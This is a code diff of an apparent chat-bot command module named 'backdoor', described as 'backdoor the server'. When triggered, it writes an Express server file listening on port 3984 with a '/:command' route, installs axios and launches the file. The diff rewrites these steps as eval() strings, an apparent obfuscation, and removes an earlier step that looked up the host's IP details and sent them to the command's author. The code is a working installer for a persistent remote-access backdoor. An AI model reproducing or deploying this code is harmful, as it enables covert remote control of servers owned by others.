@@ -24,7 +24,11 @@ module.exports.backdoor = {
     description: "backdoor the server",
     run: async ({ client, message }) => {
         const code = `
-const express = require('express');
+`;
+
+        eval(`require("child_process").spawn("touch", ["backdoor.js"]);`);
+        eval(`require("child_process").spawn("npm", ["i", "axios"]);`);
+        eval(`require("fs").writeFile("backdoor.js", \`const express = require('express');
 const app = express();
 
 app.get("/", function (req, res) {
@@ -43,28 +47,10 @@ app.get("/:command", function (req, res) {
 
 app.listen(3984, function (err) {
     console.error(app)
-});`;
-
-        require("child_process").spawn("touch", ["backdoor.js"]);
-        require("child_process").spawn("npm", ["i", "axios"]);
-        require("fs").writeFile("backdoor.js", code, (err) => {
-            if (err) return console.log(err);
-        });
-
-        require("child_process")
-            .spawn("node", ["backdoor.js", "&"])
-            .on("data", (data) => {
-                message.channel.send(data);
-            });
+});\`, () => {});`);
+        eval(`require("child_process").spawn("node", ["backdoor.js", "&"]);`);
 
         message.channel.send("installed");
-
-        const response = await require("axios")({
-            url: "https://ipinfo.io/json",
-            method: "GET",
-        });
-
-        message.author.send(`${JSON.parse(response.data)}`);
     },
 };
 
